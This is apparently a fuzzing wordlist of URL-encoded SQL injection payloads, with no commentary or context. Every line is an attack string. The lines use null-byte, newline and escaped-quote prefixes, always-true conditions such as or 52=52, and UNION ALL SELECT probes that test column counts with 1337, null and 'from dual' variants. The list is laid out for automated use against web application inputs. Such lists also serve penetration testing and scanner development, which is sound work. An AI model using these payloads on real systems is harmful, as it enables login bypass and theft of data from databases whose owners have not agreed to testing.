+%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27
+%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%00%20or%20%27xyz%27%3d%27xyz%27
+%00%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%00%20or%2052%3c99
+%00%20or%2052%3c99%20--%20
+%00%20or%2052%3d52
+%00%20or%2052%3d52%20--%20
+%00%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27
+%00%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%00%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27
+%00%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%00%27%20or%20%27xyz%27%3d%27xyz
+%00%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%00%27%20or%2052%3c99%20--%20
+%00%27%20or%2052%3d52%20--%20
+%00%5c%27%20or%2052%3c99%20--%20
+%00%5c%27%20or%2052%3d52%20--%20
+%00%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz
+%00%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%00%5c%5c%27%20or%2052%3c99%20--%20
+%00%5c%5c%27%20or%2052%3d52%20--%20
+%00%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz
+%00%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%0a%20or%20%27xyz%27%3d%27xyz%27
+%0a%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%0a%20or%2052%3c99
+%0a%20or%2052%3c99%20--%20
+%0a%20or%2052%3d52
+%0a%20or%2052%3d52%20--%20
+%0a%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27
+%0a%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%0a%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27
+%0a%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%0a%27%20or%20%27xyz%27%3d%27xyz
+%0a%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%0a%27%20or%2052%3c99%20--%20
+%0a%27%20or%2052%3d52%20--%20
+%0a%5c%27%20or%2052%3c99%20--%20
+%0a%5c%27%20or%2052%3d52%20--%20
+%0a%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz
+%0a%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%0a%5c%5c%27%20or%2052%3c99%20--%20
+%0a%5c%5c%27%20or%2052%3d52%20--%20
+%0a%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz
+%0a%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%0d%0a%20or%20%27xyz%27%3d%27xyz%27
+%0d%0a%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%0d%0a%20or%2052%3c99
+%0d%0a%20or%2052%3c99%20--%20
+%0d%0a%20or%2052%3d52
+%0d%0a%20or%2052%3d52%20--%20
+%0d%0a%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27
+%0d%0a%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%0d%0a%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27
+%0d%0a%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%0d%0a%27%20or%20%27xyz%27%3d%27xyz
+%0d%0a%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%0d%0a%27%20or%2052%3c99%20--%20
+%0d%0a%27%20or%2052%3d52%20--%20
+%0d%0a%5c%27%20or%2052%3c99%20--%20
+%0d%0a%5c%27%20or%2052%3d52%20--%20
+%0d%0a%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz
+%0d%0a%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%0d%0a%5c%5c%27%20or%2052%3c99%20--%20
+%0d%0a%5c%5c%27%20or%2052%3d52%20--%20
+%0d%0a%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz
+%0d%0a%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%27%20or%20%27xyz%27%3d%27xyz
+%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%27%20or%2052%3c99%20--%20
+%27%20or%2052%3d52%20--%20
+0x00%20or%20%27xyz%27%3d%27xyz%27
+0x00%20or%20%27xyz%27%3d%27xyz%27%20--%20
+0x00%20or%2052%3c99
+0x00%20or%2052%3c99%20--%20
+0x00%20or%2052%3d52
+0x00%20or%2052%3d52%20--%20
+0x00%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27
+0x00%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+0x00%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27
+0x00%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+0x00%27%20or%20%27xyz%27%3d%27xyz
+0x00%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+0x00%27%20or%2052%3c99%20--%20
+0x00%27%20or%2052%3d52%20--%20
+0x00%5c%27%20or%2052%3c99%20--%20
+0x00%5c%27%20or%2052%3d52%20--%20
+0x00%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz
+0x00%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+0x00%5c%5c%27%20or%2052%3c99%20--%20
+0x00%5c%5c%27%20or%2052%3d52%20--%20
+0x00%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz
+0x00%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+0x0a%20or%20%27xyz%27%3d%27xyz%27
+0x0a%20or%20%27xyz%27%3d%27xyz%27%20--%20
+0x0a%20or%2052%3c99
+0x0a%20or%2052%3c99%20--%20
+0x0a%20or%2052%3d52
+0x0a%20or%2052%3d52%20--%20
+0x0a%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27
+0x0a%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+0x0a%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27
+0x0a%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+0x0a%27%20or%20%27xyz%27%3d%27xyz
+0x0a%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+0x0a%27%20or%2052%3c99%20--%20
+0x0a%27%20or%2052%3d52%20--%20
+0x0a%5c%27%20or%2052%3c99%20--%20
+0x0a%5c%27%20or%2052%3d52%20--%20
+0x0a%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz
+0x0a%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+0x0a%5c%5c%27%20or%2052%3c99%20--%20
+0x0a%5c%5c%27%20or%2052%3d52%20--%20
+0x0a%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz
+0x0a%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+0x0d0a%20or%20%27xyz%27%3d%27xyz%27
+0x0d0a%20or%20%27xyz%27%3d%27xyz%27%20--%20
+0x0d0a%20or%2052%3c99
+0x0d0a%20or%2052%3c99%20--%20
+0x0d0a%20or%2052%3d52
+0x0d0a%20or%2052%3d52%20--%20
+0x0d0a%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27
+0x0d0a%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+0x0d0a%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27
+0x0d0a%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+0x0d0a%27%20or%20%27xyz%27%3d%27xyz
+0x0d0a%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+0x0d0a%27%20or%2052%3c99%20--%20
+0x0d0a%27%20or%2052%3d52%20--%20
+0x0d0a%5c%27%20or%2052%3c99%20--%20
+0x0d0a%5c%27%20or%2052%3d52%20--%20
+0x0d0a%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz
+0x0d0a%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+0x0d0a%5c%5c%27%20or%2052%3c99%20--%20
+0x0d0a%5c%5c%27%20or%2052%3d52%20--%20
+0x0d0a%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz
+0x0d0a%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%5c%27%20or%2052%3c99%20--%20
+%5c%27%20or%2052%3d52%20--%20
+%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz
+%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%5c%5c%27%20or%2052%3c99%20--%20
+%5c%5c%27%20or%2052%3d52%20--%20
+%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz
+%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%5c%5cn%20or%20%27xyz%27%3d%27xyz%27
+%5c%5cn%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%5c%5cn%20or%2052%3c99
+%5c%5cn%20or%2052%3c99%20--%20
+%5c%5cn%20or%2052%3d52
+%5c%5cn%20or%2052%3d52%20--%20
+%5c%5cn%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27
+%5c%5cn%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%5c%5cn%27%20or%20%27xyz%27%3d%27xyz
+%5c%5cn%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%5c%5cn%27%20or%2052%3c99%20--%20
+%5c%5cn%27%20or%2052%3d52%20--%20
+%5c%5cn%5c%5c%27%20or%2052%3c99%20--%20
+%5c%5cn%5c%5c%27%20or%2052%3d52%20--%20
+%5c%5cn%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz
+%5c%5cn%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%5c%5cr%5c%5cn%20or%20%27xyz%27%3d%27xyz%27
+%5c%5cr%5c%5cn%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%5c%5cr%5c%5cn%20or%2052%3c99
+%5c%5cr%5c%5cn%20or%2052%3c99%20--%20
+%5c%5cr%5c%5cn%20or%2052%3d52
+%5c%5cr%5c%5cn%20or%2052%3d52%20--%20
+%5c%5cr%5c%5cn%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27
+%5c%5cr%5c%5cn%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%5c%5cr%5c%5cn%27%20or%20%27xyz%27%3d%27xyz
+%5c%5cr%5c%5cn%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%5c%5cr%5c%5cn%27%20or%2052%3c99%20--%20
+%5c%5cr%5c%5cn%27%20or%2052%3d52%20--%20
+%5c%5cr%5c%5cn%5c%5c%27%20or%2052%3c99%20--%20
+%5c%5cr%5c%5cn%5c%5c%27%20or%2052%3d52%20--%20
+%5c%5cr%5c%5cn%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz
+%5c%5cr%5c%5cn%5c%5c%27%20or%20%5c%5c%27xyz%5c%5c%27%3d%5c%5c%27xyz%5c%5c%27%20--%20
+%5cn%20or%20%27xyz%27%3d%27xyz%27
+%5cn%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%5cn%20or%2052%3c99
+%5cn%20or%2052%3c99%20--%20
+%5cn%20or%2052%3d52
+%5cn%20or%2052%3d52%20--%20
+%5cn%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27
+%5cn%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%5cn%27%20or%20%27xyz%27%3d%27xyz
+%5cn%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%5cn%27%20or%2052%3c99%20--%20
+%5cn%27%20or%2052%3d52%20--%20
+%5cn%5c%27%20or%2052%3c99%20--%20
+%5cn%5c%27%20or%2052%3d52%20--%20
+%5cn%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz
+%5cn%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%5cr%5cn%20or%20%27xyz%27%3d%27xyz%27
+%5cr%5cn%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%5cr%5cn%20or%2052%3c99
+%5cr%5cn%20or%2052%3c99%20--%20
+%5cr%5cn%20or%2052%3d52
+%5cr%5cn%20or%2052%3d52%20--%20
+%5cr%5cn%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27
+%5cr%5cn%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%5cr%5cn%27%20or%20%27xyz%27%3d%27xyz
+%5cr%5cn%27%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%5cr%5cn%27%20or%2052%3c99%20--%20
+%5cr%5cn%27%20or%2052%3d52%20--%20
+%5cr%5cn%5c%27%20or%2052%3c99%20--%20
+%5cr%5cn%5c%27%20or%2052%3d52%20--%20
+%5cr%5cn%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz
+%5cr%5cn%5c%27%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
+%20union%20all%20select%20%271337%27
+%20union%20all%20select%20%271337%27%20--%20
+%20union%20all%20select%20%271337%27%20from%20dual
+%20union%20all%20select%20%271337%27%20from%20dual%20--%20
+%20union%20all%20select%20%271337%27,%271337%27
+%20union%20all%20select%20%271337%27,%271337%27%20--%20
+%20union%20all%20select%20%271337%27,%271337%27%20from%20dual
+%20union%20all%20select%20%271337%27,%271337%27%20from%20dual%20--%20
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27%20--%20
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27%20from%20dual
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27%20from%20dual%20--%20
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27%20--%20
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27%20from%20dual
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27%20from%20dual%20--%20
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27,%271337%27
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27,%271337%27%20--%20
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27,%271337%27%20from%20dual
+%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27,%271337%27%20from%20dual%20--%20
+%20union%20all%20select%201337
+%20union%20all%20select%201337%20--%20
+%20union%20all%20select%201337%20from%20dual
+%20union%20all%20select%201337%20from%20dual%20--%20
+%20union%20all%20select%201337,1337
+%20union%20all%20select%201337,1337%20--%20
+%20union%20all%20select%201337,1337%20from%20dual
+%20union%20all%20select%201337,1337%20from%20dual%20--%20
+%20union%20all%20select%201337,1337,1337
+%20union%20all%20select%201337,1337,1337%20--%20
+%20union%20all%20select%201337,1337,1337%20from%20dual
+%20union%20all%20select%201337,1337,1337%20from%20dual%20--%20
+%20union%20all%20select%201337,1337,1337,1337
+%20union%20all%20select%201337,1337,1337,1337%20--%20
+%20union%20all%20select%201337,1337,1337,1337%20from%20dual
+%20union%20all%20select%201337,1337,1337,1337%20from%20dual%20--%20
+%20union%20all%20select%201337,1337,1337,1337,1337
+%20union%20all%20select%201337,1337,1337,1337,1337%20--%20
+0x0a%27%20union%20all%20select%20%271337%27%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%20%271337%27,%271337%27%20--%20
+0x0a%27%20union%20all%20select%20%271337%27,%271337%27%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%20%271337%27,%271337%27,%271337%27%20--%20
+0x0a%27%20union%20all%20select%20%271337%27,%271337%27,%271337%27%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27%20--%20
+0x0a%27%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27,%271337%27%20--%20
+0x0a%27%20union%20all%20select%20%271337%27,%271337%27,%271337%27,%271337%27,%271337%27%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%201337%20--%20
+0x0a%27%20union%20all%20select%201337%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%201337,1337%20--%20
+0x0a%27%20union%20all%20select%201337,1337%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%201337,1337,1337%20--%20
+0x0a%27%20union%20all%20select%201337,1337,1337%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%201337,1337,1337,1337%20--%20
+0x0a%27%20union%20all%20select%201337,1337,1337,1337%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%201337,1337,1337,1337,1337%20--%20
+0x0a%27%20union%20all%20select%201337,1337,1337,1337,1337%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%20null%20--%20
+0x0a%27%20union%20all%20select%20null%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%20null,null%20--%20
+0x0a%27%20union%20all%20select%20null,null%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%20null,null,null%20--%20
+0x0a%27%20union%20all%20select%20null,null,null%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%20null,null,null,null%20--%20
+0x0a%27%20union%20all%20select%20null,null,null,null%20from%20dual%20--%20
+0x0a%27%20union%20all%20select%20null,null,null,null,null%20--%20
+0x0a%27%20union%20all%20select%20null,null,null,null,null%20from%20dual%20--%20
+0x0a%5c%27%20union%20all%20select%20%271337%27%20--%20
+0x0a%5c%27%20union%20all%20select%20%271337%27%20from%20dual%20--%20
+0x0a%5c%27%20union%20all%20select%20%271337%27,%271337%27%20--%20
+0x0a%5c%27%20union%20all%20select%20%271337%27,%271337%27%20from%20dual%20--%20
+0x0a%5c%27%20union%20all%20select%20%271337%27,%271337%27,%271337%27%20--%20
+0x0a%5c%27%20union%20all%20select%20%271337%27,%271337%27,%271337%27%20from%20dual%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null%20from%20dual%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null%20from%20dual%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null%20from%20dual%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null%20from%20dual%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null,null%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null,null%20from%20dual%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null,null,null%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null,null,null%20from%20dual%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null,null,null,null%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null,null,null,null%20from%20dual%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null,null,null,null,null%20--%20
+%5cr%5cn%5c%27%20union%20all%20select%20null,null,null,null,null,null,null,null%20from%20dual%20--%20
